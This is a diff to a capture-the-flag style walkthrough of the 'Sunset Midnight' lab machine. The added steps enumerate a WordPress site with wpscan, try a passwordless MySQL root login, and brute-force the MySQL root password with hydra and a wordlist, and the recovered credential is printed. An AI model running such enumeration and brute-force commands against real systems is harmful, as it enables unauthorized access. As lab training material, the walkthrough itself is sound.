@@ -35,7 +35,39 @@ add `sunset-midnight` to `/etc/hosts` file.
 
 ![image](https://user-images.githubusercontent.com/87468669/229475426-9059fc0f-0daf-46c2-8c65-d16323368a04.png)
 
-notice a web server running on port 80, opening it on a browser redirected us to a vhost `sunset-midnight` and as we can see it is running a wordpress cms.
+notice a web server running on port 80, opening it on a browser redirected us to a vhost `sunset-midnight` and as we can see it is running a wordpress cms. Let's enumerate further using `wpscan`.
+
+```
+wpscan --url http://sunset-midnight/ -e p,t,u 
+```
+![image](https://user-images.githubusercontent.com/87468669/229525720-679eabac-9ff4-490a-86b3-09a57ebc028c.png)
+
+using wpscan to enumerate plugins, themes and user we can see the available plugin `simply-poll-master` and user `admin`. searching for exploits for this plugin found none. let's move to the next port `3306` mysql server.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
+└─$ mysql -h sunset-midnight -u root
+ERROR 1045 (28000): Access denied for user 'root'@'192.168.49.139' (using password: NO)
+```
+tried loggin in mysql as user root without password, failed. let's try bruteforce mysql password.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
+└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.139.88 mysql
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-03 14:41:01
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 7819918 login tries (l:1/p:7819918), ~1954980 tries per task
+[DATA] attacking mysql://192.168.139.88:3306/
+[3306][mysql] host: 192.168.139.88   login: root   password: robert
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-03 14:41:44
+```
+boom we got the password for mysql server. let's login an see what we can do.
+
+
+
 
 
 
